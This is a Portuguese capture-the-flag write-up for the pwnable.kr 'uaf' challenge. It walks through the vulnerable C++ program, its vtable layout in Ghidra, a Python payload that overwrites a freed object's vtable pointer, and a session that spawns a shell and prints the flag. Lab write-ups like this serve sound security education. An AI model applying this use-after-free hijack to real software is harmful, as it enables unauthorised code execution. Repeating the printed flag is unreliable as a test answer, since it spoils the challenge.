
# UAF
###### Resolvido por @Cubano2
> Este é um CTF sobre [Use After Free]  

## Sobre o Desafio  

Mommy, what is Use After Free bug?

Running at : nc pwnable.kr 9000

## 🔗 Links do Desafio

- [Exercício](https://pwnable.kr/play.php)

## Solução

O exercício começa com a gente acessando essa máquina ``` ssh uaf@pwnable.kr -p2222```

E dentro do terminal da máquina temos esses arquivos:
```
uaf@pwnable:~$ ls
flag  uaf  uaf.cpp
```
Escrevendo ```cat uaf.cpp``` temos acesso a esse código, que além da vulnerabilidade UAF também apresenta conceitos de 'Programação Orientada à Objetos':


```c++
#include <fcntl.h>                                                                                                                           
#include <iostream>                                                                                                                          
#include <cstring>                                                                                                                           
#include <cstdlib>                                                                                                                           
#include <unistd.h>                                                                                                                          
using namespace std;                                                                                                                         
class Human{                                                                                                                                 
private:                                                                                                                                     
        virtual void give_shell(){                                                                                                           
                system("/bin/sh");                                                                                                           
        }                                                                                                                                    
protected:                                                                                                                                   
        int age;                                                                                                                             
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};
 
class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};
 
class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};
 
int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);
 
        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;
 
                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }
 
        return 0;
} 
```

Ao analisar o código percebemos que ele tem 3 funções:

Opção 1 (use) → Chama introduce() de m e w.

Opção 2 (after) → Aloca memória dinâmica, de tamanho ```argv1```, para armazenar dados de um arquivo, que está contido em ```argv2```.

Opção 3 (free) → Libera os objetos m e w.

Descompilando o código no ghidra precisamos procurar duas funções importantes no código a ```introduce``` e a ```give_shell```, pois na lógica do código, ao trocarmos a informação que adicionamos na opção 1 ```use``` conseguimos fazer o ponteiro que não estaria alocado para a função ```introduce``` e faríamos ele apontar para a função do ```give shell```. Devo ressaltar que os objetos ```m``` e ```w``` estão em uma vtable, em C++, as funções virtuais são acessadas através da Virtual Table (vtable), que contém ponteiros para as funções da classe, nesse caso a classe sendo ```human```.

Variavel man
![image](https://github.com/user-attachments/assets/d3024548-9134-4a4b-a4f0-79c773755914)

Vtable de man
![image](https://github.com/user-attachments/assets/03428383-0981-41e8-94a9-3f577418a7ab)

Vtable de human
![image](https://github.com/user-attachments/assets/604f0582-36b3-4d67-91a5-dd38965ee463)


Quando um objeto chama ```introduce()```, na verdade, ele está acessando o endereço armazenado na vtable. Pedindo ajuda pro gpt analisar o Ghidra e achar a vtable certa do que queremos ele me deu essa explicação detalhada a seguir: 
```
 A vtable de Man começa no endereço 0x401560 e contém vários campos inicializados com 0h, que são apenas preenchimentos (possivelmente espaço reservado para futuras funções virtuais ou alinhamento de memória).

Depois disso, temos:

0x401568 → addr Man::typeinfo (metadados sobre a classe Man).
0x401570 → addr Human::give_shell → Isso significa que o ponteiro nesse deslocamento está apontando para a função give_shell, que pertence à classe Human.
0x401578 → addr Man::introduce → Aqui está o ponteiro para a função introduce() da classe Man. 

``` 
```
Endereço da vtable
A vtable de Man está de fato na região que começa em 0x401560. Isso é o bloco de memória que guarda os endereços das funções virtuais de Man.

Offset do método introduce()
O ponteiro para introduce() está em 0x401578, o que significa que essa função pode ser chamada quando um objeto de Man invoca um método virtual.

Offset do método give_shell()
O ponteiro para give_shell() está em 0x401570, o que sugere que o primeiro método virtual na vtable foi sobrescrito para apontar para Human::give_shell ao invés da implementação original.
```
Neste ponto, fica claro o que precisamos fazer: alocar um espaço de memória usando a opção after para simular um objeto Man real, mas com o ponteiro da vtable modificado. Dessa forma, ao usar a opção use, em vez de chamar ```introduce```, a função ```give_shell``` será executada.
![image](https://github.com/user-attachments/assets/94bc2949-ec58-44ae-9a6a-f4d42e156662)

Para conseguirmos executar uma chamada para ```give_shell``` precisamos fazer um cálculo simples do offset. Se a vtable começa em ```0x401570``` e ```introduce()``` está em ```0x401578```, podemos calcular o deslocamento:

```0x401578 − 0x401570 = 8```

Sendo assim temos 8 bytes de offset.

E com esses 8 bytes de offset conseguimos fazer nosso ponteiro apontar para a função do ```give_shell``` sem nenhum problema. Como esse 8 bytes "adiantam" nosso ponteiro, temos que ajustá-lo para começar 8 posições antes para aí o ponteiro apontar para a posição ```0x401570-8``` que no caso será ```40 1568```. E com isso alteranfo o ponteiro da vtable para ```0x401568``` fará com que, ao buscar ```introduce()```, o programa acabe chamando ```give_shell()```.
 
E por fim precisamos criar um payload com esse endereço de ponteiro para executarmos o código e adicionar essa informação com o uso da opção 2 (after). Pedi pro Gpt me entregar um payload, com todas essas informações que encontrei e ele me passou o seguinte código para executar no terminal do ssh:
``` python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit ``` 
```
uaf@pwnable:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"\x68\x15\x40\x00" + b"\x00" * 4)' > /tmp/uaf-exploit
uaf@pwnable:~$ ./uaf 8 /tmp/uaf-exploit
1. use
2. after
3. free
->3
1. use
2. after
3. free
->2
your data is allocated
1. use
2. after
3. free
->2
your data is allocated
1. use
2. after
3. free
->1
$ cat flag
yay_f1ag_aft3r_pwning
$ 

```
![image](https://github.com/user-attachments/assets/d9e1f927-e39c-4ec7-a0d4-06c0457fd740)

>`yay_f1ag_aft3r_pwning`
